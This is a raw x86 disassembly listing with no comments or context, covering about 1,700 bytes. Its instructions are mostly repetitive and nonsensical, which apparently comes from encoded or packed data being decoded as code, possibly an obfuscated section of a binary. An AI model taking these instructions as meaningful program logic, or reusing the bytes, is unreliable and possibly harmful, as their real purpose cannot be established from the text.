  43002f:	popa   
  430030:	popa   
  430031:	xchg   esp,eax
  430032:	pop    ss
  430033:	loop   0x43001b
  430035:	bound  esp,QWORD PTR [edx+0x62]
  430038:	adc    al,0xdf
  43003a:	xor    DWORD PTR [ecx+0x61],esp
  43003d:	xchg   esp,eax
  43003e:	pop    ss
  43003f:	loop   0x4300ad
  430041:	bound  esp,QWORD PTR [edx+0x62]
  430044:	adc    al,0xa3
  430046:	int3   
  430047:	popa   
  430048:	popa   
  430049:	xchg   esp,eax
  43004a:	pop    ss
  43004b:	loop   0x430038
  43004d:	bound  esp,QWORD PTR [edx+0x62]
  430050:	adc    al,0xc5
  430052:	int3   
  430053:	popa   
  430054:	popa   
  430055:	xchg   esp,eax
  430056:	pop    ss
  430057:	jne    0x430034
  430059:	adc    al,0x34
  43005b:	int3   
  43005c:	popa   
  43005d:	popa   
  43005e:	xchg   esp,eax
  43005f:	pop    ss
  430060:	jne    0x43003b
  430062:	adc    al,0xe0
  430064:	int3   
  430065:	popa   
  430066:	popa   
  430067:	xchg   esp,eax
  430068:	pop    ss
  430069:	jne    0x4300d9
  43006b:	adc    al,0x9c
  43006d:	int3   
  43006e:	popa   
  43006f:	popa   
  430070:	xchg   esp,eax
  430071:	pop    ss
  430072:	jne    0x430029
  430074:	adc    al,0xe5
  430076:	int3   
  430077:	popa   
  430078:	popa   
  430079:	xchg   esp,eax
  43007a:	pop    ss
  43007b:	jne    0x430081
  43007d:	adc    al,0xa8
  43007f:	int3   
  430080:	popa   
  430081:	popa   
  430082:	xchg   esp,eax
  430083:	pop    ss
  430084:	jne    0x4300a0
  430086:	adc    al,0xe6
  430088:	int3   
  430089:	popa   
  43008a:	popa   
  43008b:	xchg   esp,eax
  43008c:	pop    ss
  43008d:	jne    0x43009f
  43008f:	adc    al,0x72
  430091:	int3   
  430092:	popa   
  430093:	popa   
  430094:	xchg   esp,eax
  430095:	pop    ss
  430096:	jne    0x4300a6
  430098:	adc    al,0xe3
  43009a:	int3   
  43009b:	popa   
  43009c:	popa   
  43009d:	xchg   esp,eax
  43009e:	pop    ss
  43009f:	jne    0x4300ad
  4300a1:	adc    al,0x9e
  4300a3:	int3   
  4300a4:	popa   
  4300a5:	popa   
  4300a6:	xchg   esp,eax
  4300a7:	pop    ss
  4300a8:	jne    0x4300bc
  4300aa:	adc    al,0x34
  4300ac:	int3   
  4300ad:	popa   
  4300ae:	popa   
  4300af:	xchg   esp,eax
  4300b0:	pop    ss
  4300b1:	jne    0x43009c
  4300b3:	adc    al,0x38
  4300b5:	int3   
  4300b6:	popa   
  4300b7:	popa   
  4300b8:	xchg   esp,eax
  4300b9:	pop    ss
  4300ba:	jne    0x4300ab
  4300bc:	adc    al,0xcc
  4300be:	inc    ebp
  4300bf:	popa   
  4300c0:	popa   
  4300c1:	xchg   esp,eax
  4300c2:	pop    ss
  4300c3:	jne    0x4300ba
  4300c5:	adc    al,0xd3
  4300c7:	es popa 
  4300c9:	popa   
  4300ca:	xchg   esp,eax
  4300cb:	pop    ss
  4300cc:	jne    0x4300d8
  4300ce:	adc    al,0xdc
  4300d0:	dec    eax
  4300d1:	popa   
  4300d2:	popa   
  4300d3:	xchg   esp,eax
  4300d4:	pop    ss
  4300d5:	jne    0x4300d8
  4300d7:	adc    al,0xdf
  4300d9:	xor    DWORD PTR [ecx+0x61],esp
  4300dc:	xchg   esp,eax
  4300dd:	pop    ss
  4300de:	jne    0x4300e7
  4300e0:	adc    al,0xa3
  4300e2:	int3   
  4300e3:	popa   
  4300e4:	popa   
  4300e5:	xchg   esp,eax
  4300e6:	pop    ss
  4300e7:	jne    0x4300e6
  4300e9:	adc    al,0xdf
  4300eb:	int3   
  4300ec:	popa   
  4300ed:	popa   
  4300ee:	xchg   esp,eax
  4300ef:	pop    ss
  4300f0:	jne    0x430146
  4300f2:	adc    al,0x34
  4300f4:	int3   
  4300f5:	popa   
  4300f6:	popa   
  4300f7:	xchg   esp,eax
  4300f8:	pop    ss
  4300f9:	jne    0x430155
  4300fb:	adc    al,0xe0
  4300fd:	int3   
  4300fe:	popa   
  4300ff:	popa   
  430100:	xchg   esp,eax
  430101:	pop    ss
  430102:	jne    0x430128
  430104:	adc    al,0xaa
  430106:	int3   
  430107:	popa   
  430108:	popa   
  430109:	xchg   esp,eax
  43010a:	pop    ss
  43010b:	jne    0x4300c8
  43010d:	adc    al,0xde
  43010f:	int3   
  430110:	popa   
  430111:	popa   
  430112:	xchg   esp,eax
  430113:	pop    ss
  430114:	jne    0x4300c7
  430116:	adc    al,0xa8
  430118:	int3   
  430119:	popa   
  43011a:	popa   
  43011b:	xchg   esp,eax
  43011c:	pop    ss
  43011d:	jne    0x4300d6
  43011f:	adc    al,0xdd
  430121:	int3   
  430122:	popa   
  430123:	popa   
  430124:	xchg   esp,eax
  430125:	pop    ss
  430126:	jne    0x4300d5
  430128:	adc    al,0x2d
  43012a:	int3   
  43012b:	popa   
  43012c:	popa   
  43012d:	xchg   esp,eax
  43012e:	pop    ss
  43012f:	jne    0x4300e4
  430131:	adc    al,0x13
  430133:	shl    DWORD PTR [ecx+0x61],cl
  430136:	xchg   esp,eax
  430137:	pop    ss
  430138:	jne    0x430142
  43013a:	adc    al,0x38
  43013c:	int3   
  43013d:	popa   
  43013e:	popa   
  43013f:	xchg   esp,eax
  430140:	pop    ss
  430141:	jne    0x430149
  430143:	adc    al,0x34
  430145:	int3   
  430146:	popa   
  430147:	popa   
  430148:	xchg   esp,eax
  430149:	pop    ss
  43014a:	jne    0x430160
  43014c:	adc    al,0x37
  43014e:	int3   
  43014f:	popa   
  430150:	popa   
  430151:	xchg   esp,eax
  430152:	pop    ss
  430153:	jne    0x43017f
  430155:	adc    al,0xcc
  430157:	mul    DWORD PTR [ecx+0x61]
  43015a:	xchg   esp,eax
  43015b:	pop    ss
  43015c:	jne    0x43017e
  43015e:	adc    al,0xdc
  430160:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  430161:	popa   
  430162:	popa   
  430163:	xchg   esp,eax
  430164:	pop    ss
  430165:	jne    0x430185
  430167:	adc    al,0x83
  430169:	mov    ecx,0x17946161
  43016e:	jne    0x43018c
  430170:	adc    al,0xec
  430172:	outs   dx,DWORD PTR ds:[esi]
  430173:	popa   
  430174:	popa   
  430175:	xchg   esp,eax
  430176:	pop    ss
  430177:	jne    0x43019b
  430179:	adc    al,0xa3
  43017b:	int3   
  43017c:	popa   
  43017d:	popa   
  43017e:	xchg   esp,eax
  43017f:	pop    ss
  430180:	jne    0x43017b
  430182:	adc    al,0xe3
  430184:	int3   
  430185:	popa   
  430186:	popa   
  430187:	xchg   esp,eax
  430188:	pop    ss
  430189:	loop   0x430131
  43018b:	bound  esp,QWORD PTR [edx+0x62]
  43018e:	adc    al,0x34
  430190:	int3   
  430191:	popa   
  430192:	popa   
  430193:	xchg   esp,eax
  430194:	pop    ss
  430195:	loop   0x4301c9
  430197:	bound  esp,QWORD PTR [edx+0x62]
  43019a:	adc    al,0xc5
  43019c:	int3   
  43019d:	popa   
  43019e:	popa   
  43019f:	xchg   esp,eax
  4301a0:	pop    ss
  4301a1:	loop   0x430215
  4301a3:	bound  esp,QWORD PTR [edx+0x62]
  4301a6:	adc    al,0xa1
  4301a8:	int3   
  4301a9:	popa   
  4301aa:	popa   
  4301ab:	xchg   esp,eax
  4301ac:	pop    ss
  4301ad:	loop   0x430157
  4301af:	bound  esp,QWORD PTR [edx+0x62]
  4301b2:	adc    al,0xdc
  4301b4:	int3   
  4301b5:	popa   
  4301b6:	popa   
  4301b7:	xchg   esp,eax
  4301b8:	pop    ss
  4301b9:	loop   0x430159
  4301bb:	bound  esp,QWORD PTR [edx+0x62]
  4301be:	adc    al,0x9d
  4301c0:	int3   
  4301c1:	popa   
  4301c2:	popa   
  4301c3:	xchg   esp,eax
  4301c4:	pop    ss
  4301c5:	loop   0x43014b
  4301c7:	bound  esp,QWORD PTR [edx+0x62]
  4301ca:	adc    al,0x7
  4301cc:	shl    DWORD PTR [ecx+0x61],cl
  4301cf:	xchg   esp,eax
  4301d0:	pop    ss
  4301d1:	loop   0x43017d
  4301d3:	bound  esp,QWORD PTR [edx+0x62]
  4301d6:	adc    al,0x72
  4301d8:	int3   
  4301d9:	popa   
  4301da:	popa   
  4301db:	xchg   esp,eax
  4301dc:	pop    ss
  4301dd:	loop   0x43017f
  4301df:	bound  esp,QWORD PTR [edx+0x62]
  4301e2:	adc    al,0xe1
  4301e4:	int3   
  4301e5:	popa   
  4301e6:	popa   
  4301e7:	xchg   esp,eax
  4301e8:	pop    ss
  4301e9:	loop   0x430181
  4301eb:	bound  esp,QWORD PTR [edx+0x62]
  4301ee:	adc    al,0xa9
  4301f0:	int3   
  4301f1:	popa   
  4301f2:	popa   
  4301f3:	xchg   esp,eax
  4301f4:	pop    ss
  4301f5:	loop   0x430193
  4301f7:	bound  esp,QWORD PTR [edx+0x62]
  4301fa:	adc    al,0x34
  4301fc:	int3   
  4301fd:	popa   
  4301fe:	popa   
  4301ff:	xchg   esp,eax
  430200:	pop    ss
  430201:	loop   0x4301a5
  430203:	bound  esp,QWORD PTR [edx+0x62]
  430206:	adc    al,0x84
  430208:	int3   
  430209:	popa   
  43020a:	popa   
  43020b:	xchg   esp,eax
  43020c:	pop    ss
  43020d:	loop   0x4301a7
  43020f:	bound  esp,QWORD PTR [edx+0x62]
  430212:	adc    al,0xcc
  430214:	mul    DWORD PTR [ecx+0x61]
  430217:	xchg   esp,eax
  430218:	pop    ss
  430219:	loop   0x430247
  43021b:	bound  esp,QWORD PTR [edx+0x62]
  43021e:	adc    al,0xdc
  430220:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  430221:	popa   
  430222:	popa   
  430223:	xchg   esp,eax
  430224:	pop    ss
  430225:	loop   0x43029b
  430227:	bound  esp,QWORD PTR [edx+0x62]
  43022a:	adc    al,0x83
  43022c:	mov    ecx,0x17946161
  430231:	loop   0x43020d
  430233:	bound  esp,QWORD PTR [edx+0x62]
  430236:	adc    al,0xec
  430238:	outs   dx,DWORD PTR ds:[esi]
  430239:	popa   
  43023a:	popa   
  43023b:	xchg   esp,eax
  43023c:	pop    ss
  43023d:	loop   0x43020f
  43023f:	bound  esp,QWORD PTR [edx+0x62]
  430242:	adc    al,0xa3
  430244:	int3   
  430245:	popa   
  430246:	popa   
  430247:	xchg   esp,eax
  430248:	pop    ss
  430249:	loop   0x430211
  43024b:	bound  esp,QWORD PTR [edx+0x62]
  43024e:	adc    al,0xe7
  430250:	int3   
  430251:	popa   
  430252:	popa   
  430253:	xchg   esp,eax
  430254:	pop    ss
  430255:	jne    0x4302af
  430257:	adc    al,0x34
  430259:	int3   
  43025a:	popa   
  43025b:	popa   
  43025c:	xchg   esp,eax
  43025d:	pop    ss
  43025e:	jne    0x4302a6
  430260:	adc    al,0xde
  430262:	int3   
  430263:	popa   
  430264:	popa   
  430265:	xchg   esp,eax
  430266:	pop    ss
  430267:	jne    0x430291
  430269:	adc    al,0xa3
  43026b:	int3   
  43026c:	popa   
  43026d:	popa   
  43026e:	xchg   esp,eax
  43026f:	pop    ss
  430270:	jne    0x430298
  430272:	adc    al,0x7a
  430274:	int3   
  430275:	popa   
  430276:	popa   
  430277:	xchg   esp,eax
  430278:	pop    ss
  430279:	jne    0x4302cb
  43027b:	adc    al,0x72
  43027d:	int3   
  43027e:	popa   
  43027f:	popa   
  430280:	xchg   esp,eax
  430281:	pop    ss
  430282:	jne    0x4302c2
  430284:	adc    al,0xe1
  430286:	int3   
  430287:	popa   
  430288:	popa   
  430289:	xchg   esp,eax
  43028a:	pop    ss
  43028b:	jne    0x4302c9
  43028d:	adc    al,0x2e
  43028f:	int3   
  430290:	popa   
  430291:	popa   
  430292:	xchg   esp,eax
  430293:	pop    ss
  430294:	jne    0x4302d8
  430296:	adc    al,0x34
  430298:	int3   
  430299:	popa   
  43029a:	popa   
  43029b:	xchg   esp,eax
  43029c:	pop    ss
  43029d:	jne    0x4302e7
  43029f:	adc    al,0x2d
  4302a1:	int3   
  4302a2:	popa   
  4302a3:	popa   
  4302a4:	xchg   esp,eax
  4302a5:	pop    ss
  4302a6:	jne    0x4302de
  4302a8:	adc    al,0x0
  4302aa:	das    
  4302ab:	popa   
  4302ac:	popa   
  4302ad:	xchg   esp,eax
  4302ae:	pop    ss
  4302af:	jne    0x4302c9
  4302b1:	adc    al,0x7
  4302b3:	jae    0x430316
  4302b5:	popa   
  4302b6:	xchg   esp,eax
  4302b7:	pop    ss
  4302b8:	jne    0x4302d0
  4302ba:	adc    al,0x1
  4302bc:	jmp    0x43031f
  4302be:	popa   
  4302bf:	xchg   esp,eax
  4302c0:	pop    ss
  4302c1:	jne    0x4302b6
  4302c3:	adc    al,0x19
  4302c5:	push   ecx
  4302c6:	popa   
  4302c7:	popa   
  4302c8:	xchg   esp,eax
  4302c9:	pop    ss
  4302ca:	jne    0x4302bd
  4302cc:	adc    al,0xdd
  4302ce:	fbld   TBYTE PTR [ecx+0x61]
  4302d1:	xchg   esp,eax
  4302d2:	pop    ss
  4302d3:	jne    0x430339
  4302d5:	adc    al,0xd1
  4302d7:	jno    0x43033a
  4302d9:	popa   
  4302da:	xchg   esp,eax
  4302db:	pop    ss
  4302dc:	jne    0x4302cb
  4302de:	adc    al,0x9c
  4302e0:	int3   
  4302e1:	popa   
  4302e2:	popa   
  4302e3:	xchg   esp,eax
  4302e4:	pop    ss
  4302e5:	jne    0x430318
  4302e7:	or     eax,0x6262e7e2
  4302ec:	bound  ecx,QWORD PTR ds:0x616850db
  4302f2:	popa   
  4302f3:	or     eax,0x17610d61
  4302f8:	loop   0x4302dd
  4302fa:	bound  esp,QWORD PTR [edx+0x62]
  4302fd:	push   DWORD PTR [ebp+0x60]
  430300:	cmp    al,0xff
  430302:	jne    0x43035b
  430304:	dec    ecx
  430305:	push   DWORD PTR [ebp+0x4e]
  430308:	push   DWORD PTR ss:[ebp+0x4d]
  43030c:	and    al,0xff
  43030e:	jne    0x43035c
  430310:	mov    al,0xff
  430312:	jne    0x430367
  430314:	loopne 0x430315
  430316:	jne    0x430381
  430318:	in     eax,dx
  430319:	push   DWORD PTR [ebp+0x30]
  43031c:	repz push DWORD PTR [ebp+0x67]
  430320:	inc    edx
  430321:	push   DWORD PTR [ebp+0x5e]
  430324:	lock push DWORD PTR [ebp+0x55]
  430328:	and    al,0xff
  43032a:	jne    0x430388
  43032c:	mov    al,0xff
  43032e:	jne    0x430393
  430330:	loopne 0x430331
  430332:	loop   0x4302e5
  430334:	arpl   WORD PTR [edx+0x62],sp
  430337:	repz jmp edx
  43033a:	lods   al,BYTE PTR ds:[esi]
  43033b:	arpl   WORD PTR [edx+0x62],sp
  43033e:	xor    eax,0x63b7e2ff
  430343:	bound  esp,QWORD PTR [edx-0x3e]
  430346:	jmp    edx
  430348:	mov    edx,0x64626263
  43034d:	jmp    edx
  43034f:	lods   eax,DWORD PTR ds:[esi]
  430350:	arpl   WORD PTR [edx+0x62],sp
  430353:	notrack jmp edx
  430356:	das    
  430357:	arpl   WORD PTR [edx+0x62],sp
  43035a:	out    dx,al
  43035b:	jmp    edx
  43035d:	mov    bl,0x63
  43035f:	bound  esp,QWORD PTR [edx+0x36]
  430362:	jmp    edx
  430364:	and    eax,0xe0626263
  430369:	or     eax,0xb859a75
  43036e:	call   0xa8e8:0x5e343ac9
  430375:	popa   
  430376:	pop    ss
  430377:	loop   0x43039d
  430379:	arpl   WORD PTR [edx+0x62],sp
  43037c:	out    dx,al
  43037d:	xchg   DWORD PTR ds:0xb858675,ecx
  430383:	call   0x6324:0x130d3ac9
  43038a:	bound  esp,QWORD PTR [edx+0x13]
  43038d:	outs   dx,BYTE PTR ds:[esi]
  43038e:	push   0x61a8e85e
  430393:	pop    ss
  430394:	loop   0x4303ba
  430396:	arpl   WORD PTR [edx+0x62],sp
  430399:	fsub   DWORD PTR [ebx]
  43039b:	and    al,0x63
  43039d:	bound  esp,QWORD PTR [edx+0x3b]
  4303a0:	jae    0x430325
  4303a2:	or     eax,0x626324e2
  4303a7:	bound  edx,QWORD PTR [ebx+0x60342c06]
  4303ad:	test   eax,ebx
  4303af:	popa   
  4303b0:	popa   
  4303b1:	popa   
  4303b2:	fcomp  DWORD PTR [edx+ebx*4]
  4303b5:	or     eax,0x62632413
  4303ba:	bound  eax,QWORD PTR [esp+ebp*1]
  4303bd:	lea    esp,[eax-0x12]
  4303c0:	and    ecx,DWORD PTR ds:0xb859a75
  4303c6:	call   0xa8e8:0x5e343ac9
  4303cd:	popa   
  4303ce:	pop    ss
  4303cf:	loop   0x430425
  4303d1:	arpl   WORD PTR [edx+0x62],sp
  4303d4:	out    dx,al
  4303d5:	xchg   DWORD PTR ds:0xb858675,ecx
  4303db:	call   0x6354:0x130d3ac9
  4303e2:	bound  esp,QWORD PTR [edx+0x13]
  4303e5:	outs   dx,BYTE PTR ds:[esi]
  4303e6:	push   0x61a8e85e
  4303eb:	pop    ss
  4303ec:	loop   0x430442
  4303ee:	arpl   WORD PTR [edx+0x62],sp
  4303f1:	fsub   DWORD PTR [ebx]
  4303f3:	push   esp
  4303f4:	arpl   WORD PTR [edx+0x62],sp
  4303f7:	cmp    dh,BYTE PTR [ebx-0x7d]
  4303fa:	or     eax,0x626354e2
  4303ff:	bound  edx,QWORD PTR [ebx+0x69342c06]
  430405:	test   eax,ebx
  430407:	popa   
  430408:	popa   
  430409:	popa   
  43040a:	fcomp  DWORD PTR [edx+ebx*4]
  43040d:	or     eax,0x62635413
  430412:	bound  eax,QWORD PTR [esp+ebp*1]
  430415:	lea    ebp,[ecx-0x12]
  430418:	and    ecx,DWORD PTR ds:0xb859a75
  43041e:	call   0xa8e8:0x5e343ac9
  430425:	popa   
  430426:	pop    ss
  430427:	loop   0x430426
  430429:	arpl   WORD PTR [edx+0x62],sp
  43042c:	out    dx,al
  43042d:	xchg   DWORD PTR ds:0xb858675,ecx
  430433:	call   0x63fd:0x130d3ac9
  43043a:	bound  esp,QWORD PTR [edx+0x13]
  43043d:	outs   dx,BYTE PTR ds:[esi]
  43043e:	push   0x61a8e85e
  430443:	pop    ss
  430444:	loop   0x430443
  430446:	arpl   WORD PTR [edx+0x62],sp
  430449:	fsub   DWORD PTR [ebx]
  43044b:	std    
  43044c:	arpl   WORD PTR [edx+0x62],sp
  43044f:	call   0x63fd:0xe20dd573
  430456:	bound  esp,QWORD PTR [edx-0x6d]
  430459:	push   es
  43045a:	outs   dx,BYTE PTR ds:[esi]
  43045b:	xor    al,0xb1
  43045d:	arpl   WORD PTR [edx+0x62],sp
  430460:	test   eax,ebx
  430462:	popa   
  430463:	popa   
  430464:	popa   
  430465:	fcomp  DWORD PTR [edx+ebx*4]
  430468:	or     eax,0x6263fd13
  43046d:	bound  eax,QWORD PTR [esi+ebp*2]
  430470:	lea    esi,[ecx-0x119d9d9d]
  430476:	repnz adc esi,DWORD PTR [ebp+0x5d]
  43047a:	pop    ss
  43047b:	loop   0x430474
  43047d:	bound  esp,QWORD PTR [edx+0x62]
  430480:	or     eax,0x6262f7e2
  430485:	bound  esp,QWORD PTR [ecx]
  430487:	popa   
  430488:	in     eax,dx
  430489:	push   ebp
  43048a:	(bad)  
  43048b:	ins    DWORD PTR es:[edi],dx
  43048c:	(bad)  
  43048d:	jmp    0x936d:0x8f55ed5d
  430494:	loop   0x430468
  430496:	push   0x5bd86161
  43049b:	jmp    0x430500
  43049d:	bound  esp,QWORD PTR [edx+0x61]
  4304a0:	and    edx,esp
  4304a2:	out    0x63,eax
  4304a4:	bound  esp,QWORD PTR [edx-0x10]
  4304a7:	inc    ebx
  4304a8:	xor    al,0x3a
  4304aa:	adc    al,0xe8
  4304ac:	int3   
  4304ad:	popa   
  4304ae:	popa   
  4304af:	xchg   esp,eax
  4304b0:	pop    ss
  4304b1:	loop   0x430492
  4304b3:	arpl   WORD PTR [edx+0x62],sp
  4304b6:	adc    al,0x34
  4304b8:	int3   
  4304b9:	popa   
  4304ba:	popa   
  4304bb:	xchg   esp,eax
  4304bc:	pop    ss
  4304bd:	loop   0x43049c
  4304bf:	arpl   WORD PTR [edx+0x62],sp
  4304c2:	adc    al,0xe3
  4304c4:	int3   
  4304c5:	popa   
  4304c6:	popa   
  4304c7:	xchg   esp,eax
  4304c8:	pop    ss
  4304c9:	loop   0x4304a6
  4304cb:	arpl   WORD PTR [edx+0x62],sp
  4304ce:	adc    al,0xa7
  4304d0:	int3   
  4304d1:	popa   
  4304d2:	popa   
  4304d3:	xchg   esp,eax
  4304d4:	pop    ss
  4304d5:	loop   0x4304b0
  4304d7:	arpl   WORD PTR [edx+0x62],sp
  4304da:	adc    al,0xe1
  4304dc:	int3   
  4304dd:	popa   
  4304de:	popa   
  4304df:	xchg   esp,eax
  4304e0:	pop    ss
  4304e1:	loop   0x430551
  4304e3:	arpl   WORD PTR [edx+0x62],sp
  4304e6:	adc    al,0xa3
  4304e8:	int3   
  4304e9:	popa   
  4304ea:	popa   
  4304eb:	xchg   esp,eax
  4304ec:	pop    ss
  4304ed:	loop   0x4304a4
  4304ef:	arpl   WORD PTR [edx+0x62],sp
  4304f2:	adc    al,0xf
  4304f4:	shl    DWORD PTR [ecx+0x61],cl
  4304f7:	xchg   esp,eax
  4304f8:	pop    ss
  4304f9:	loop   0x4304ff
  4304fb:	arpl   WORD PTR [edx+0x62],sp
  4304fe:	adc    al,0x96
  430500:	int3   
  430501:	popa   
  430502:	popa   
  430503:	xchg   esp,eax
  430504:	pop    ss
  430505:	loop   0x430521
  430507:	arpl   WORD PTR [edx+0x62],sp
  43050a:	adc    al,0xe6
  43050c:	int3   
  43050d:	popa   
  43050e:	popa   
  43050f:	xchg   esp,eax
  430510:	pop    ss
  430511:	loop   0x430523
  430513:	arpl   WORD PTR [edx+0x62],sp
  430516:	adc    al,0x72
  430518:	int3   
  430519:	popa   
  43051a:	popa   
  43051b:	xchg   esp,eax
  43051c:	pop    ss
  43051d:	loop   0x43052d
  43051f:	arpl   WORD PTR [edx+0x62],sp
  430522:	adc    al,0x34
  430524:	int3   
  430525:	popa   
  430526:	popa   
  430527:	xchg   esp,eax
  430528:	pop    ss
  430529:	loop   0x430537
  43052b:	arpl   WORD PTR [edx+0x62],sp
  43052e:	adc    al,0xa9
  430530:	int3   
  430531:	popa   
  430532:	popa   
  430533:	xchg   esp,eax
  430534:	pop    ss
  430535:	loop   0x430549
  430537:	arpl   WORD PTR [edx+0x62],sp
  43053a:	adc    al,0xcc
  43053c:	mul    DWORD PTR [ecx+0x61]
  43053f:	xchg   esp,eax
  430540:	pop    ss
  430541:	loop   0x43052c
  430543:	arpl   WORD PTR [edx+0x62],sp
  430546:	adc    al,0xdc
  430548:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  430549:	popa   
  43054a:	popa   
  43054b:	xchg   esp,eax
  43054c:	pop    ss
  43054d:	loop   0x43053e
  43054f:	arpl   WORD PTR [edx+0x62],sp
  430552:	adc    al,0x83
  430554:	mov    ecx,0x17946161
  430559:	loop   0x430550
  43055b:	arpl   WORD PTR [edx+0x62],sp
  43055e:	adc    al,0xec
  430560:	outs   dx,DWORD PTR ds:[esi]
  430561:	popa   
  430562:	popa   
  430563:	xchg   esp,eax
  430564:	pop    ss
  430565:	loop   0x430571
  430567:	arpl   WORD PTR [edx+0x62],sp
  43056a:	adc    al,0xa3
  43056c:	int3   
  43056d:	popa   
  43056e:	popa   
  43056f:	xchg   esp,eax
  430570:	pop    ss
  430571:	loop   0x430574
  430573:	arpl   WORD PTR [edx+0x62],sp
  430576:	or     eax,0xb858675
  43057b:	call   0xa8e8:0x5e343ac9
  430582:	popa   
  430583:	pop    ss
  430584:	loop   0x43059a
  430586:	arpl   WORD PTR [edx+0x62],sp
  430589:	or     eax,0xb859a75
  43058e:	call   0x24e2:0x6e213ac9
  430595:	dec    esi
  430596:	push   edi
  430597:	popa   
  430598:	bound  esp,QWORD PTR [edx+0x61]
  43059b:	popa   
  43059c:	adc    esp,edx
  43059e:	adc    al,0x63
  4305a0:	bound  esp,QWORD PTR [edx-0x2e]
  4305a3:	or     eax,0xb858675
  4305a8:	call   0xa8e8:0x5e343ac9
  4305af:	popa   
  4305b0:	rcl    BYTE PTR [ebx],cl
  4305b2:	loop   0x430593
  4305b4:	arpl   WORD PTR [edx+0x62],sp
  4305b7:	ror    BYTE PTR ds:0x6262e7e2,cl
  4305bd:	bound  ecx,QWORD PTR ds:0x6168f5db
  4305c3:	popa   
  4305c4:	bound  esi,QWORD PTR [edx+0xd]
  4305c7:	jne    0x43055b
  4305c9:	bound  ebx,QWORD PTR [eax+0x17]
  4305cc:	loop   0x4305b1
  4305ce:	arpl   WORD PTR [edx+0x62],sp
  4305d1:	fsub   DWORD PTR [ebx]
  4305d3:	jecxz  0x430638
  4305d5:	bound  esp,QWORD PTR [edx+0x61]
  4305d8:	out    0x93,eax
  4305da:	clc    
  4305db:	cmp    al,0x76
  4305dd:	test   DWORD PTR [ebp+eax*4+0x98b9759],0xf7763cf6
  4305e8:	mov    WORD PTR ds:0x6262e7e2,cs
  4305ee:	bound  ecx,QWORD PTR ds:0x616810db
  4305f4:	popa   
  4305f5:	or     eax,0x6fd69acd
  4305fa:	or     ebx,DWORD PTR [edx+0x1fd63ac9]
  430600:	pop    esi
  430601:	call   0x9ae467ae
  430606:	xchg   ebx,eax
  430607:	loop   0x43063d
  430609:	xor    al,0x61
  43060b:	popa   
  43060c:	or     eax,0xb859a75
  430611:	call   0xa8e8:0x5e343ac9
  430618:	popa   
  430619:	or     eax,0x6262e713
  43061e:	bound  ecx,QWORD PTR ds:0x6168df17
  430624:	popa   
  430625:	pop    ss
  430626:	push   0x859a750d
  43062b:	or     ebx,DWORD PTR [edx+0x5e343ac9]
  430631:	call   0x135067de
  430636:	out    0x62,eax
  430638:	bound  esp,QWORD PTR [edx+0xd]
  43063b:	pop    ss
  43063c:	fld    TBYTE PTR [eax+0x61]
  43063f:	popa   
  430640:	pop    ss
  430641:	push   0x63bee2ff
  430646:	bound  esp,QWORD PTR [edx-0xd]
  430649:	jmp    edx
  43064b:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  43064c:	arpl   WORD PTR [edx+0x62],sp
  43064f:	xor    eax,0x63a4e2ff
  430654:	bound  esp,QWORD PTR [edx-0x3e]
  430657:	jmp    edx
  430659:	retf   
  43065a:	arpl   WORD PTR [edx+0x62],sp
  43065d:	fs jmp edx
  430660:	retf   0x6263
  430663:	bound  edi,QWORD PTR [esi]
  430665:	jmp    edx
  430667:	shl    DWORD PTR [ebx+0x62],0x62
  43066b:	out    dx,al
  43066c:	jmp    edx
  43066e:	shl    BYTE PTR [ebx+0x62],0x62
  430672:	ss jmp edx
  430675:	(bad)  
  430676:	arpl   WORD PTR [edx+0x62],sp
  430679:	loopne 0x43068f
  43067b:	jp     0x430649
  43067d:	popa   
  43067e:	popa   
  43067f:	xchg   esp,eax
  430680:	pop    ss
  430681:	loop   0x4306cf
  430683:	pop    esp
  430684:	bound  esp,QWORD PTR [edx+0x14]
  430687:	xor    al,0xcc
  430689:	popa   
  43068a:	popa   
  43068b:	xchg   esp,eax
  43068c:	pop    ss
  43068d:	loop   0x4306e1
  43068f:	pop    esp
  430690:	bound  esp,QWORD PTR [edx+0x14]
  430693:	jecxz  0x430661
  430695:	popa   
  430696:	popa   
  430697:	xchg   esp,eax
  430698:	pop    ss
  430699:	loop   0x4306f3
  43069b:	pop    esp
  43069c:	bound  esp,QWORD PTR [edx+0x14]
  43069f:	stos   BYTE PTR es:[edi],al
  4306a0:	int3   
  4306a1:	popa   
  4306a2:	popa   
  4306a3:	xchg   esp,eax
  4306a4:	pop    ss
  4306a5:	loop   0x4306ed
  4306a7:	pop    esp
  4306a8:	bound  esp,QWORD PTR [edx+0x14]
  4306ab:	in     al,0xd3
  4306ad:	popa   
  4306ae:	popa   
  4306af:	xchg   esp,eax
  4306b0:	pop    ss
  4306b1:	loop   0x4306db
  4306b3:	pop    esp
  4306b4:	bound  esp,QWORD PTR [edx+0x14]
  4306b7:	mov    eax,ds:0x946161cc
  4306bc:	pop    ss
  4306bd:	loop   0x4306e5
  4306bf:	pop    esp
  4306c0:	bound  esp,QWORD PTR [edx+0x14]
  4306c3:	loope  0x430691
  4306c5:	popa   
  4306c6:	popa   
  4306c7:	xchg   esp,eax
  4306c8:	pop    ss
  4306c9:	loop   0x43071b
  4306cb:	pop    esp
  4306cc:	bound  esp,QWORD PTR [edx+0x14]
  4306cf:	mov    ds:0x946161cc,eax
  4306d4:	pop    ss
  4306d5:	loop   0x430715
  4306d7:	pop    esp
  4306d8:	bound  esp,QWORD PTR [edx+0x14]
  4306db:	xor    al,0xcc
  4306dd:	popa   
  4306de:	popa   
  4306df:	xchg   esp,eax
  4306e0:	pop    ss
  4306e1:	loop   0x43071f
  4306e3:	pop    esp
  4306e4:	bound  esp,QWORD PTR [edx+0x14]
  4306e7:	xchg   esi,eax
  4306e8:	int3   
  4306e9:	popa   
  4306ea:	popa   
  4306eb:	xchg   esp,eax
  4306ec:	pop    ss
  4306ed:	loop   0x430731
  4306ef:	pop    esp
  4306f0:	bound  esp,QWORD PTR [edx+0x14]
  4306f3:	imul   eax,DWORD PTR [eax],0x17946161
  4306f9:	loop   0x430743
  4306fb:	pop    esp
  4306fc:	bound  esp,QWORD PTR [edx+0x14]
  4306ff:	in     eax,0x13
  430701:	popa   
  430702:	popa   
  430703:	xchg   esp,eax
  430704:	pop    ss
  430705:	loop   0x43073d
  430707:	pop    esp
  430708:	bound  esp,QWORD PTR [edx+0x14]
  43070b:	jo     0x430733
  43070d:	popa   
  43070e:	popa   
  43070f:	xchg   esp,eax
  430710:	pop    ss
  430711:	loop   0x43072b
  430713:	pop    esp
